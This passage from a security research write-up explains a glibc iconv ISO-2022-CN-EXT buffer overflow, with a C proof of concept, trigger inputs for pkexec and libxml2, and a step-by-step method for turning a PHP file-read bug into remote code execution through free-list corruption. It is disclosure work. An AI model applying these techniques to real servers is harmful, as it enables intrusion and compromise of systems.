<span class="w">        </span><span class="n">assert</span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">CNS11643_2_set</span><span class="p">);</span><span class="w"> </span><span class="cm">/* XXX */</span>
<span class="w">        </span><span class="n">escseq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"*H"</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ESC</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">'$'</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="o">++</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="o">++</span><span class="p">;</span>

<span class="w">        </span><span class="n">ann</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ann</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">SS2_ann</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">used</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">SS3_mask</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">ann</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">SS3_ann</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">))</span><span class="w"> </span><span class="c1">// [3]</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// &lt;-------------------- NO BOUND CHECK</span>

<span class="w">        </span><span class="n">assert</span><span class="p">((</span><span class="n">used</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">7</span><span class="p">);</span>
<span class="w">        </span><span class="n">escseq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"+I+J+K+L+M"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">used</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ESC</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">'$'</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="o">++</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="o">++</span><span class="p">;</span>

<span class="w">        </span><span class="n">ann</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ann</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">SS3_ann</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>To trigger the bug, we need to force <code>iconv()</code> to emit an escape sequence, right before the end of the output buffer. To do so, we can use exotic characters, such as: <code>å</code>, <code>ä</code>, <code>å³</code> or <code>æ¹¿</code>. The result is an overflow of 1 to 3 bytes, with the following values:</p><ul><li><code>$*H</code> [<code>24 2A 48</code>]</li><li><code>$+I</code> [<code>24 2B 49</code>]</li><li><code>$+J</code> [<code>24 2B 4A</code>]</li><li><code>$+K</code> [<code>24 2B 4B</code>]</li><li><code>$+L</code> [<code>24 2B 4C</code>]</li><li><code>$+M</code> [<code>24 2B 4D</code>]</li></ul><p>A quick <a href="https://github.com/ambionics/cnext-exploits/blob/main/pocs/poc.c">POC</a> demonstrates the bug:</p><div class="highlight"><pre><span></span><code><span class="cm">/*</span>
<span class="cm">$ gcc -o poc ./poc.c &amp;&amp; ./poc</span>
<span class="cm">*/</span>
<span class="p">...</span>

<span class="kt">void</span><span class="w"> </span><span class="n">hexdump</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">buflen</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="p">...</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">iconv_t</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iconv_open</span><span class="p">(</span><span class="s">"ISO-2022-CN-EXT"</span><span class="p">,</span><span class="w"> </span><span class="s">"UTF-8"</span><span class="p">);</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">input</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"AAAAAå"</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">output</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">pinput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">poutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">output</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Same size for input and output buffer: 8 bytes</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">sinput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">soutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sinput</span><span class="p">;</span>

<span class="w">    </span><span class="n">iconv</span><span class="p">(</span><span class="n">cd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pinput</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sinput</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">poutput</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">soutput</span><span class="p">);</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Remaining bytes (should be &gt; 0): %zd</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">soutput</span><span class="p">);</span>

<span class="w">    </span><span class="n">hexdump</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>This produces, on vulnerable systems:</p><div class="highlight"><pre><span></span><code>$<span class="w"> </span>gcc<span class="w"> </span>-o<span class="w"> </span>poc<span class="w"> </span>./poc.c<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./poc
Remaining<span class="w"> </span>bytes<span class="w"> </span><span class="o">(</span>should<span class="w"> </span>be<span class="w"> </span>&gt;<span class="w"> </span><span class="m">0</span><span class="o">)</span>:<span class="w"> </span>-1
<span class="m">000000</span>:<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span><span class="m">41</span><span class="w"> </span>1b<span class="w"> </span><span class="m">24</span><span class="w"> </span>2a<span class="w">  </span><span class="m">48</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w">  </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w">    </span>AAAA<span class="w"> </span>A.<span class="nv">$*</span><span class="w"> </span>H...<span class="w"> </span>....
</code></pre></div><p>Nine bytes have been written, despite telling <code>iconv()</code> to write eight at most.</p><p>Checking the <a href="https://github.com/lattera/glibc/commit/755104edc75c53f4a0e7440334e944ad3c6b32fc#diff-c55a50730dd1a15db405b851229d49697508e27710403e4995f0f9d628295c36">commit history</a>, I noticed that the bug was very old: it appeared in year 2000, making it 24 years old.</p><p>Now, what could be done with this bug?</p><h2 id="conditions-and-primitive">Conditions and primitive</h2><p>With this vulnerability, I had a 1-to-3 bytes overflow, with non-controlled characters. This was not much. In addition to this, there were preconditions. I needed find a call to <code>iconv()</code> in which I:</p><ul><li>controlled the output charset (<code>ISO-2022-CN-EXT</code>)</li><li>controlled part of the input buffer (to put in the beautiful chinese characters)</li></ul><p>With this in mind, I started looking for targets. From grepping <code>iconv</code> in my <code>/lib</code> and <code>/bin</code> directory to iterating over hundreds of OSS projects, I found a few interesting targets. None were actually exploitable.</p><p>As an example, let's look at a very promising target: <code>libxml2</code>.</p><h3 id="libxml2-an-ocean-of-bytes">libxml2: an ocean of bytes</h3><p><strong>libxml2</strong> only processes XML in <em>UTF-8</em>. If an XML document is not <em>UTF-8</em>, it will be converted to it, then processed, and then converted back to its original charset when all is done. The conversions are done using <code>iconv()</code>.</p><p>As a result, we can meet our preconditions with such a document:</p><div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-2022-CN-EXT"?&gt;</span>
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;21124;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div><p><em>Note: 21124 is the unicode codepoint for å.</em></p><p>Now, remember: the buffer management is the responsibility of the caller. And when <code>libxml2</code> uses <code>iconv()</code> to convert our document back to its original charset, it allocates an <strong>output buffer</strong> which is <strong>4 times as big</strong> as the <strong>input buffer</strong> (<a href="https://github.com/GNOME/libxml2/blob/e349709ae7e07a2183304ccc9352b6ac86f62a18/encoding.c#L2454">code</a>). Too big for us: we cannot reach the bounds of the buffer to overflow. A dead end.</p><h3 id="pkexec-4-bytes-are-too-many">pkexec: 4 bytes are too many</h3><p>Another interesting target was <strong>pkexec</strong>, a setuid binary present in many linux distros. The binary lets you pick the charset for every message it outputs, by setting the <code>CHARSET</code> environment variable. Example:</p><div class="highlight"><pre><span></span><code>$<span class="w"> </span><span class="nv">CHARSET</span><span class="o">=</span>ISO-2022-CN-EXT<span class="w"> </span>pkexec<span class="w"> </span><span class="s1">'triggerå'</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>hexyl
ââââââââââ¬ââââââââââââââââââââââââââ¬ââââââââââââââââââââââââââ¬âââââââââ¬âââââââââ
â00000000â<span class="w"> </span><span class="m">43</span><span class="w"> </span><span class="m">61</span><span class="w"> </span>6e<span class="w"> </span>6e<span class="w"> </span>6f<span class="w"> </span><span class="m">74</span><span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">72</span><span class="w"> </span>â<span class="w"> </span><span class="m">75</span><span class="w"> </span>6e<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">70</span><span class="w"> </span><span class="m">72</span><span class="w"> </span>6f<span class="w"> </span><span class="m">67</span><span class="w"> </span><span class="m">72</span><span class="w"> </span>âCannot<span class="w"> </span>râun<span class="w"> </span>progrâ
â00000010â<span class="w"> </span><span class="m">61</span><span class="w"> </span>6d<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">74</span><span class="w"> </span><span class="m">72</span><span class="w"> </span><span class="m">69</span><span class="w"> </span><span class="m">67</span><span class="w"> </span><span class="m">67</span><span class="w"> </span>â<span class="w"> </span><span class="m">65</span><span class="w"> </span><span class="m">72</span><span class="w"> </span>1b<span class="w"> </span><span class="m">24</span><span class="w"> </span>2a<span class="w"> </span><span class="m">48</span><span class="w"> </span>1b<span class="w"> </span>4e<span class="w"> </span>âam<span class="w"> </span>triggâerâ¢<span class="nv">$*</span>Hâ¢Nâ
â00000020â<span class="w"> </span>4c<span class="w"> </span><span class="m">61</span><span class="w"> </span>0f<span class="w"> </span>3a<span class="w"> </span><span class="m">20</span><span class="w"> </span>4e<span class="w"> </span>6f<span class="w"> </span><span class="m">20</span><span class="w"> </span>â<span class="w"> </span><span class="m">73</span><span class="w"> </span><span class="m">75</span><span class="w"> </span><span class="m">63</span><span class="w"> </span><span class="m">68</span><span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">66</span><span class="w"> </span><span class="m">69</span><span class="w"> </span>6c<span class="w"> </span>âLaâ¢:<span class="w"> </span>No<span class="w"> </span>âsuch<span class="w"> </span>filâ
â00000030â<span class="w"> </span><span class="m">65</span><span class="w"> </span><span class="m">20</span><span class="w"> </span>6f<span class="w"> </span><span class="m">72</span><span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">64</span><span class="w"> </span><span class="m">69</span><span class="w"> </span><span class="m">72</span><span class="w"> </span>â<span class="w"> </span><span class="m">65</span><span class="w"> </span><span class="m">63</span><span class="w"> </span><span class="m">74</span><span class="w"> </span>6f<span class="w"> </span><span class="m">72</span><span class="w"> </span><span class="m">79</span><span class="w"> </span>0a<span class="w">    </span>âe<span class="w"> </span>or<span class="w"> </span>dirâectory_<span class="w"> </span>â
ââââââââââ´ââââââââââââââââââââââââââ´ââââââââââââââââââââââââââ´âââââââââ´âââââââââ
</code></pre></div><p>Internally, <code>pkexec</code> uses the <code>GLib</code> to output its messages. It does the following:</p><div class="highlight"><pre><span></span><code><span class="cp">#define NUL_TERMINATOR_LENGTH 4</span>

<span class="n">outbuf_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">NUL_TERMINATOR_LENGTH</span><span class="p">;</span>

<span class="n">outbytes_remaining</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">outbuf_size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">NUL_TERMINATOR_LENGTH</span><span class="p">;</span>
<span class="n">outp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g_malloc</span><span class="w"> </span><span class="p">(</span><span class="n">outbuf_size</span><span class="p">);</span>

<span class="p">...</span>

<span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g_iconv</span><span class="w"> </span><span class="p">(</span><span class="n">converter</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">inbytes_remaining</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">outp</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">outbytes_remaining</span><span class="p">);</span>
</code></pre></div><p>While it allocates a buffer of <em>N + 4</em> bytes, it only tells iconv about <em>N</em> bytes. Our overflow is, at most, 3 bytes long. Therefore, no matter how hard we try, we cannot reach outside the buffer.</p><p>Another dead end.</p><h3 id="conditions-and-primitive-updated">Conditions and primitive (updated)</h3><p>Filled with disappointment, I could only update my list of requirements. To exploit the bug, we needed to:</p><ul><li>control the output charset (<code>ISO-2022-CN-EXT</code>)</li><li>control part of the input buffer</li><li><strong>have a suitable output buffer</strong></li></ul><h1 id="exploiting-php-filters">Exploiting PHP filters</h1><p>Even after looking for days, I did not manage to find a valid target. Blindly grepping for <code>iconv()</code> calls in libraries and binaries, going through the open source ecosystem, looking for a triggerable instance of the bug, I was desperately looking for a crash. One. crash. To no avail.</p><p>To get my hopes back up, I went back to PHP: after all, it <em>did</em> crash, without me even asking for it.</p><p>The goal was simple: converting boring file reads vulnerabilities into remote code execution.</p><h2 id="a-primer-on-phps-heap">A primer on PHP's heap</h2><p><em>Note: in this section, and in each section describing the internals of PHP, I will make approximations and pass over certain things.</em></p><p>To get where this is going, we need to understand how the PHP heap works (at least, <em>part of it</em>). Do not worry, it is a very simple heap.</p><p>To allocate with PHP, you use <code>emalloc(N)</code>, with <em>N</em> the number of bytes that you want. You get back a pointer to a chunk (a memory block) that can store at least <em>N</em> bytes. When you're done with your chunk, you free it using <code>efree(ptr)</code>. PHP has chunks of various sizes (8, 0x10, 0x18, ... 0x200, 0x280, ...).</p><p>The PHP heap consists of a region of 2MB, split in 512 pages of 0x1000 bytes. Each page may contain chunks of a certain size. For instance, page 10 may contain chunks of size 0x100, page 11 chunks of size 0x38, page 12 chunks of size 0x180, <em>etc.</em> There is no metadata in between chunks.</p><p>When you free a chunk, it gets put at the beginning of a singly linked list called the free list. There is a free list for each chunk size. As an example, if I were to free a chunk of size 0x38, it would go in the free list for chunks of size 0x38. If I free a chunk of size 0x200, it goes in the free list for chunks of size 0x200...</p><p>To allocate <em>N</em> bytes, PHP looks into the free list for the corresponding chunk size, takes out the head, and returns it. If the free list is empty (<em>i.e.</em> all available chunks have already been allocated), PHP looks into the heap metadata to find a page that is not used. It then creates empty chunks in such a page, and puts them in the free list.</p><p>Free lists are LIFO, meaning that when I free a chunk of some size, it becomes the head of the free list. When I allocate, the head is taken out. This is very similar to the glibc's tcache, but unlimited.</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/php-heap.png"/><em>Visual representation of PHP's heap</em></p><p>In the example above, we have a visual representation of the heap on the left. It contains 512 pages, and here page <em>5</em> stores chunks of size <em>0x400</em>. If we look at the contents of this page, we can see that it contains <em>4</em> chunks (as <em>4 Ã 0x400 = 0x1000</em>, the size of a page). Here, chunk #1 and #3 are allocated, and chunk #2 and #4 are freed. Therefore, they are in the free list for the chunks of size <em>0x400</em>.</p><p>The free list being a singly-linked list, each unallocated chunk contains, as its 8 first bytes, a pointer to the next free chunk. That is what we see in chunk #2: a pointer to <em>0x7ff10201400</em>, which is the address of the next free chunk for size <em>0x400</em>. Now, if we were to <strong>overflow</strong> from chunk #1 to chunk #2, we'd overwrite this pointer. That is a good starting point for an exploit: even with a one-byte overflow, we can change a free list pointer, thus <strong>altering the free list</strong>.</p><p>One should note that <strong>PHP creates a new heap</strong> for each HTTP request. This is one of the reasons that make remote PHP exploitation hard â but this will get covered in part 2.</p><h2 id="php-filters-internals">PHP filters internals</h2><p>Now that we know how PHP allocates and deallocates, we can have a look at how PHP handles a <code>php://filter/</code> string. We're lucky here: we don't need to get into details of internal PHP structures, such as <code>zval</code>, <code>zend_string</code>, <code>zend_array</code>, to name a few.</p><p>To process a filter, PHP will first get the stream (<em>i.e.</em> read the resource). It stores the stream in a collection of buckets, doubly-linked structures that each contain a buffer of some size. Sticking to our <code>/etc/passwd</code> example, we may have 3 buckets: the first one may contain the first 5 bytes of the file, the second bucket 30 more, and the third one another 1000. Linked together, they constitute a <em>bucket brigade</em>.</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/stream-simple.raw.drawio.png"/><em>A bucket brigade of 3 buckets containing <code>/etc/passwd</code></em></p><p>This is a standard way of representing a stream as a collection of buffers of various sizes. You could imagine this as a list of packets received over the network. Packet 1 contains the first N bytes of data, packet 2 contains the next M bytes, <em>etc.</em></p><p>Now that PHP has read the contents of a resource into a stream, represented by a <em>bucket brigade</em>, it can apply filters onto it. It takes the first filter, and processes the first bucket. To do so, it allocates an output buffer of the same size as the bucket's buffer (in our example, that would be 5 bytes), and does the conversion. If the filter is <code>string.upper</code> for instance, it converts every lowercase character in the input buffer into its uppercase equivalent in the output buffer. It can then create a new bucket which points to this buffer.</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/stream-simple.filtered.drawio.png"/><em>Applying <code>string.upper</code> on a bucket brigade</em></p><p>It then processes bucket 2, then bucket 3, and so on until it reaches the last bucket. It now has a <em>new bucket brigade</em> with every output bucket. It can now apply the second filter onto this brigade, and keep going until the last filter has been processed.</p><h2 id="situation-and-goals">Situation and goals</h2><p>We're done with the definitions. Let's go back to our original vulnerability: a file read.</p><div class="highlight"><pre><span></span><code><span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]);</span>
</code></pre></div><p>Now that we can trigger a memory corruption using the <code>convert.iconv.XXX.ISO-2022-CN-EXT</code> filter, we want remote code execution. And it does not look too hard to exploit.</p><p>First, since we have a file read primitive, we can read binaries (PHP, Apache, ...). We can even download the libc and check if it is patched! We don't care about ASLR and PIE either: we can read <code>/proc/self/maps</code>. Finally, it feels like we can almost arbitrarily allocate or deallocate buffers using buckets, which is convenient.</p><p>On the other side, there are many contexts in which you can get a file read primitive: you might get it on a Symfony 4.x running on PHP 7.0, or in an obscure Wordpress plugin running on PHP 8.3, or even during blackbox assessments. The <em>ideal</em> exploit needs to be resilient: it has to work against most targets, without any tweaks.</p><h2 id="exploitation">Exploitation</h2><p>With all this in mind, let's start exploiting. The idea is to use a single-byte buffer overflow to modify the LSB of the pointer to a free chunk, in order to get control over some free list.</p><h3 id="single-bucket">Single bucket</h3><p>The first problem that we face is that, despite having the bucket brigade technology, PHP only creates <strong>one</strong> bucket. If you read a file, you get one bucket with the whole file. If you request an HTTP URL, PHP creates one bucket with the whole HTTP response. With <code>ftp://</code>, one bucket as well. This is very <em>impractical</em>, to say the least: we cannot use buckets to pad the heap, spray stuff, or even use the altered free list.</p><p>Think about it: with a single bucket, we can overflow into a free chunk and modify a free list, but we are then out of buckets, and we need at least 2 more allocations to use our altered free list!</p><p>Luckily for us, one filter saves the day: <code>zlib.inflate</code>. This filter takes our stream and decompresses it. To do so, it allocates a buffer of 8 pages (<em>0x8000</em> bytes) and inflates our stream into it. If it is not big enough, it creates a new buffer of the same size to store the rest of the data. If these two are still not enough, it creates another buffer. Each buffer is then added to a bucket. Perfect: we can use this filter to create as many buckets as we want, which is a good step forward.</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/zlib-filter.png"/><em>Applying <code>zlib.inflate</code> to create several buckets</em></p><p>However, these buckets have buffers of size <em>0x8000</em>, which is not a good size for exploitation; buffer these sizes get allocated in a different fashion than the one I told you about, and don't land into free list when freed. We need to resize our buckets.</p><h3 id="dechunking-properly">Dechunking properly</h3><p>To do so, we'll use a filter that is not documented by PHP, but is well known by attackers: <code>dechunk</code>. This filter decodes a string which is HTTP-chunked encoded.</p><p>HTTP-chunked is a very simple encoding where you send data by chunk (not a <em>heap</em> chunk, a <em>data</em> chunk). First, you send a size as ASCII-hex, followed by a newline, and then, the chunk of data of the corresponding size, followed by a newline. Then you send another size, another chunk, another size, another chunk, and you indicate the end of the data by sending a size of <em>0</em> (<em>zero</em>).</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/dechunk.png" style="width: 50%; display: block; margin-left: auto; margin-right: auto;"/><span style="width: 50%; display: block; margin-left: auto; margin-right: auto;"><em>Data encoded using the HTTP-chunked encoding</em></span></p><p>In the example, the first chunk is <em>8</em> bytes long, the second is <em>17</em> bytes long (<em>11h</em>), and the last one <em>13</em> bytes long. After <code>dechunk</code>ing, the result would be: <code>This is how the chunked encoding works</code>.</p><p>With this filter, resizing our buckets sounds like a child's play: in each bucket, we prefix the data with the size that we want (e.g. <em>0x148</em> in the first one, <em>0x100</em> for the second, etc.), then we put the data, and then a final <em>0</em> indicating that we are done.</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/dechunk-fail.png"/><em>Setting up buckets for <code>dechunk</code></em></p><p>It looks good, but it will <strong>not work</strong>. Although being processed separately, the buckets are not <strong>independent</strong>: they are all parsed as one big stream. When the <code>dechunk</code> filter processes the stream, it reads the size in the first bucket, <em>0x148</em>, takes 0x148 bytes out, and then reads a size of <em>zero</em>, which causes it to stop parsing. It does not go to the second bucket. It just stops parsing entirely. The final result of our operation is that we went from having several buckets (good) back to a single bucket (bad).</p><p>Luckily, it is not too difficult to find a way to circumvent this: in each bucket, we provide one size, and one data chunk. To do so, instead of naively writing a size, we pad it with thousands of zeroes, in order to get something like this:</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/dechunk-ok.png"/><em>Properly setting up buckets for <code>dechunk</code></em></p><p>Now, after bucket 1 has been processed, the dechunk parser jumps to bucket 2, ready to read a new size, and then to bucket 3, and so on. It works! We can now create <strong>as many buckets</strong> as we want, with the <strong>size</strong> that we want. We have made a huge leap forward.</p><h3 id="free-list-control-write-what-where">Free list control: write-what-where</h3><p>Our goal is now to alter some free list by overwriting the LSB of some pointer with the value <em>48h</em> (<code>H</code> in ASCII). In order to get the same effect unconditionally, we target chunks of size <em>0x100</em>, because the LSB of chunks' addresses is always zero. This means that the effect of our overflow is always the same: <strong>adding 0x48 to a chunk pointer</strong>.</p><p>To exploit, we follow a very standard procedure of 6 steps. We name the free list for chunks of size 0x100 <code>FL[0x100]</code>.</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/exploit-steps.png"/><em>Controlling <code>FL[0x100]</code></em></p><p>Consider that we have managed to pad the heap by allocating lots of <em>0x100</em> chunks. We thus have, somewhere in memory, three contiguous free chunks <code>A</code>, <code>B</code>, and <code>C</code>, with <code>A</code> being head of <code>FL[100]</code>. <code>A</code> points to <code>B</code>, which points to <code>C</code>. We can allocate the 3 of them (step 2), and free them again (step 3). At this point, the free list is reversed: we have <code>C</code>â<code>B</code>â<code>A</code>. We then allocate again, but this time we put an arbitrary pointer <code>0x1122334455</code> at offset <code>48h</code> of <code>C</code> (step 4). We free them again (step 5), and get the exact same state as in step 1, but this time with a small difference: at <code>C+48h</code>, we have an arbitrary pointer. We can now perform the overflow from chunk <code>A</code>, which shifts the pointer contained in <code>B</code>. It now points to <code>C+48h</code>, and as a result the free list is now <code>B</code>â<code>C+48h</code>â<code>0x1122334455</code>. With 3 more allocations, we can make PHP allocate at our arbitrary address.</p><p>We now have a <strong>write-what-where</strong>; this is almost over.</p><p>But let me get back to the implementation of the exploit. In the various steps described here, we have chunks that get allocated, and then freed. But we cannot truly get rid of buckets: we can only make their size change. However, we are only <strong>interested in chunks of size 0x100</strong>. It is as if the other chunks did not exist. Therefore, I built each bucket as an <strong>HTTP-chunked russian doll</strong>:</p><p><img alt="" src="/images/iconv-cve-2024-2961-p1/russian.png" style="width: 50%; display: block; margin-left: auto; margin-right: auto;"/><span style="width: 50%; display: block; margin-left: auto; margin-right: auto;"><em>A russian doll of a bucket: its size changes on each <code>dechunk</code></em></span></p><p>For each step of the exploit, the <code>dechunk</code> filter is called: the size of each bucket thus changes. Some have their size become 0x100, thus "appearing" in the exploitation, and some become smaller, thus disappearing. It gives us a perfect way to have buckets materialize at a specific moment, and throw them away when we don't need them anymore.</p><p>With that out of the way, let's get code execution.</p><h3 id="code-execution">Code execution</h3><p>Although we see memory regions by reading <code>/proc/self/maps</code>, we don't <em>precisely</em> know where we are in the heap. Luckily, we can completely ignore this problem by locating PHP's heap. It is easily identifiable, due to its alignment (<em>~0x1fffff</em>) and size (2MB). At its top resides a <code>zend_mm_heap</code> structure, that contains very useful fields:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">_zend_mm_heap</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">...</span>
<span class="w">    </span><span class="kt">int</span><span class="w">                </span><span class="n">use_custom_heap</span><span class="p">;</span>
<span class="w">    </span><span class="p">...</span>
<span class="w">    </span><span class="n">zend_mm_free_slot</span><span class="w"> </span><span class="o">*</span><span class="n">free_slot</span><span class="p">[</span><span class="n">ZEND_MM_BINS</span><span class="p">];</span><span class="w"> </span><span class="cm">/* free lists for small sizes */</span>
<span class="w">    </span><span class="p">...</span>
<span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
